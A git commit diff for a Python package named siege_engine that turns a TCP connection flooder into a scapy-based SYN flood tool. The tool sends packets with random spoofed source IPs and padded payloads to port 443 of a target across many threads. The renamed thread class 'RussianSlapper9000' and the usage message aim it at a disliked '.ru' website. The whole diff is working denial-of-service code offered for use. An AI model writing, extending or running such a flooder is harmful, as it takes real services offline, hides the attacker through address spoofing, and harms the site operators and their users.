6d9fa4d0334ba28bfc8558e802ca5c807a58e697
Piotr Antosz <hello@piotr-antosz.pl>
2022-02-25 23:32:50 +0100

    Add scapy support

--- setup.py
+++ setup.py
@@ -1,4 +1,10 @@
-from setuptools import setup
+from setuptools import setup, find_packages
 
 
-setup(version='1.5')
+setup(
+    version='1.6',
+    packages=find_packages(include=['scapy']),
+    install_requires=[
+        'scapy>=2.3.2',
+    ]
+)
--- siege_engine/operate.py
+++ siege_engine/operate.py
@@ -1,24 +1,49 @@
-import socket
-import threading
-import time
-import sys
+import random
 
-connections = 0
+from scapy.all import *
+
+connections: int = 0
+
+
+def random_ip() -> str:
+    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+    return ip
+
+
+def random_int() -> int:
+    x = random.randint(1000, 9000)
+    return x
+
 
 def flood_tcp(host: str):
     global connections
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        sock.connect((host, 443))
+        s_port: int = random_int()
+        s_eq: int = random_int()
+        w_indow: int = random_int()
+
+        IP_Packet = IP()
+        IP_Packet.src = random_ip()
+        IP_Packet.dst = host
+
+        TCP_Packet = TCP()
+        TCP_Packet.sport = s_port
+        TCP_Packet.dport = 443
+        TCP_Packet.flags = "S"
+        TCP_Packet.seq = s_eq
+        TCP_Packet.window = w_indow
+
+        RAW = Raw(b"X" * 1024)
+
+        send(IP_Packet / TCP_Packet / RAW, verbose=0)
+
         time.sleep(3)
-        sock.close()
         connections += 1
     except (socket.error, socket.timeout):
         pass
 
 
-class DoYourThing(threading.Thread):
+class RussianSlapper9000(threading.Thread):
     def __init__(self, hostname: str):
         self.hostname = hostname
         super().__init__()
@@ -31,17 +56,21 @@ class DoYourThing(threading.Thread):
 def run():
     global connections
     if len(sys.argv) < 3:
-        print('Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru')
+        print(
+            "Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru"
+        )
         sys.exit(1)
     amount, hostname = sys.argv[1:]
-    print('Pinging %s on %s threads' % (hostname, amount))
+    print(f"Pinging {hostname} on {amount} threads")
     amount = int(amount)
     now = (time.time())
     for _ in range(amount):
-        DoYourThing(hostname).start()
+        RussianSlapper9000(hostname).start()
     while True:
         if int(time.time()) != now:
             now = int(time.time())
-            print('Last seconds made', connections, 'calls which involved', connections*24, 'wasted bytes on the behalf of',
-                  hostname)
+            print(
+                f"Last seconds made {connections} calls "
+                f"which involved {connections * 24} wasted bytes on behalf of the {hostname}"
+            )
             connections = 0
